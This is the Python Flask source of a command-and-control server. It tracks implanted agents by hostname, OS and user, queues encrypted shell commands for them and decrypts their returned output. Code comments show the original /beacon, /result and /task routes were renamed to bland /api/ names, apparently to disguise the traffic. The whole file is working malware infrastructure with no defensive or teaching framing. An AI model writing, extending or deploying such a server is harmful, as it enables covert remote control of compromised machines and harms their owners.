from flask import Flask, request, jsonify
from common.cryptography_helpers import encrypt_string, decrypt_string
import time

app = Flask(__name__)

tasks = {} #in-memory task list
agents = {}


@app.route('/api/status', methods=['POST']) # old /beacon
def status():
    data = request.json
    agent_id = request.json.get('id')
    meta = data.get('meta', {})
    
    agents[agent_id] = {
        "hostname" : meta.get("hostname"),
        "os" : meta.get("os"),
        "user" : meta.get("user"),
        "last_seen" : time.time()
    }
    
    if agent_id in tasks and tasks[agent_id]:
        task = tasks[agent_id].pop(0)
        encrypted_task = encrypt_string(task)
        return jsonify({"task": encrypted_task})
    else: 
        return jsonify({"task" : None})
    
    
@app.route('/api/upload', methods=['POST']) # old /result 
def result():
    agent_id = request.json.get('id')
    output = request.json.get('output')
    try:
            plaintext = decrypt_string(output)
            print(f"[+] Result from {agent_id}: {plaintext}")
    except Exception:
        print("[!] Decryption failed")
    return jsonify({"status": "received"})


@app.route('/api/push', methods=['POST']) # old /task
def task():
    agent_id = request.json.get('id')
    command = request.json.get('command')
    if agent_id not in tasks:
        tasks[agent_id] = []
    tasks[agent_id].append(command)
    return jsonify({"status" : "task queued"})


@app.route('/api/agents', methods = ['GET'])
def list_agents():
    return jsonify(agents)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)



    
  




